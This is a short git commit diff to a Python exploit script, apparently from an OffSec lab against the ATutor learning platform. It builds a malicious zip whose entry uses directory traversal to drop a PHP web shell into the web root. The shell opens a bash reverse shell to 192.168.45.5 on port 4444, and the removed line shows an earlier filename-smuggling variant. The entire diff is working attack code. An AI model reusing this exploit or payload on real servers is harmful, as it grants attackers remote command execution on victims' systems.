d93b000824943e2efb665fe0cb7df6f935459f89
Gary Hooks <garyhooks@gmail.com>
2023-02-28 14:55:30 +0000

    Update zip_file.py

--- ATutor/zip_file.py
+++ ATutor/zip_file.py
@@ -7,8 +7,9 @@ def build_zip():
 	z = zipfile.ZipFile(f, "w", zipfile.ZIP_DEFLATED)
 	#z.writestr("poc/poc1.txt", "offsec")
 	
-	z.writestr("shell/shell.php%0d%0a.png", "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/192.168.45.5/4444 0>&1'\");?>")
-	z.writestr("imsmanifest.xml", "<validTag></validTag>")
+	z.writestr("../../../../../var/www/html/ATutor/mods/shell14.php5", "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/192.168.45.5/4444 0>&1'\");?>")
+	z.writestr("imsmanifest.xml", "invalid tag!")
+	#z.writestr("imsmanifest.xml", "<validTag></validTag>")
 	z.close()
 
 	zip = open("shell.zip", "wb")
